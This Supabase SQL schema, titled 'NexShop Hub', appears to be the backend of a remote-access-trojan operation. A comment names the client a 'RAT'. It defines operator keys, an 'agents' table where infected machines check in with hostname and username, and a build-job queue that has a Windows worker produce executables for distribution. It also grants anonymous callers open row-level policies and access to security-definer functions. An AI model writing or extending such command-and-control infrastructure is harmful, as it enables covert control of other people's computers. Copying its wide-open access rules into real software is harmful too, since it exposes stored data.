-- NexShop Hub — schema Supabase
-- SQL Editor → Run

-- Operators (keys lab)
create table if not exists operators (
  key text primary key,
  name text not null,
  created_at timestamptz default now()
);

insert into operators (key, name) values
  ('julyan1234', 'Julyan'),
  ('pote9999', 'Pote')
on conflict (key) do update set name = excluded.name;

-- Agents (VMs)
create table if not exists agents (
  id text primary key,
  owner_key text not null references operators(key) on delete cascade,
  hostname text default '?',
  username text default '?',
  panel_url text default '',
  local_url text default '',
  port int default 0,
  last_seen timestamptz default now(),
  created_at timestamptz default now()
);

create index if not exists agents_owner_idx on agents(owner_key);
create index if not exists agents_seen_idx on agents(last_seen desc);

-- Build jobs (site → worker Windows)
create table if not exists build_jobs (
  id uuid primary key default gen_random_uuid(),
  owner_key text not null references operators(key) on delete cascade,
  status text not null default 'queued', -- queued | building | done | error
  webhook boolean default false,
  webhook_url text default '',
  hub_url text default '',
  error text default '',
  storage_path text default '',
  created_at timestamptz default now(),
  finished_at timestamptz
);

create index if not exists build_jobs_status_idx on build_jobs(status, created_at);

-- RLS
alter table operators enable row level security;
alter table agents enable row level security;
alter table build_jobs enable row level security;

-- Anon key in browser/RAT: policies by owner_key header is not native —
-- we use a simple approach: grant select/insert/update via SECURITY DEFINER RPCs
-- OR open policies for lab (tighten later).

-- LAB policies (open read/write with key check in RPC) — start permissive for lab
drop policy if exists op_select on operators;
create policy op_select on operators for select using (true);

drop policy if exists agents_all on agents;
create policy agents_all on agents for all using (true) with check (true);

drop policy if exists builds_all on build_jobs;
create policy builds_all on build_jobs for all using (true) with check (true);

-- RPC: list agents for a key
create or replace function list_agents(p_key text)
returns setof agents
language sql
security definer
as $$
  select * from agents
  where owner_key = p_key
  order by last_seen desc nulls last;
$$;

-- RPC: upsert agent hello
create or replace function agent_hello(
  p_id text,
  p_owner_key text,
  p_hostname text,
  p_username text,
  p_panel_url text,
  p_local_url text,
  p_port int
) returns text
language plpgsql
security definer
as $$
begin
  if not exists (select 1 from operators where key = p_owner_key) then
    raise exception 'unknown owner_key';
  end if;
  insert into agents (id, owner_key, hostname, username, panel_url, local_url, port, last_seen)
  values (
    coalesce(nullif(p_id, ''), gen_random_uuid()::text),
    p_owner_key,
    coalesce(p_hostname, '?'),
    coalesce(p_username, '?'),
    coalesce(p_panel_url, ''),
    coalesce(p_local_url, ''),
    coalesce(p_port, 0),
    now()
  )
  on conflict (id) do update set
    hostname = excluded.hostname,
    username = excluded.username,
    panel_url = case when excluded.panel_url <> '' then excluded.panel_url else agents.panel_url end,
    local_url = case when excluded.local_url <> '' then excluded.local_url else agents.local_url end,
    port = excluded.port,
    last_seen = now();
  return p_id;
end;
$$;

-- RPC: create build job
create or replace function create_build_job(
  p_owner_key text,
  p_hub_url text,
  p_webhook boolean,
  p_webhook_url text
) returns uuid
language plpgsql
security definer
as $$
declare
  jid uuid;
begin
  if not exists (select 1 from operators where key = p_owner_key) then
    raise exception 'unknown owner_key';
  end if;
  insert into build_jobs (owner_key, hub_url, webhook, webhook_url, status)
  values (p_owner_key, coalesce(p_hub_url, ''), coalesce(p_webhook, false), coalesce(p_webhook_url, ''), 'queued')
  returning id into jid;
  return jid;
end;
$$;

grant execute on function list_agents(text) to anon, authenticated;
grant execute on function agent_hello(text,text,text,text,text,text,int) to anon, authenticated;
grant execute on function create_build_job(text,text,boolean,text) to anon, authenticated;

-- Storage bucket for exes (Dashboard → Storage → New bucket "builds" public download OR signed)
-- insert policy via dashboard: allow authenticated/anon upload only from service role in worker
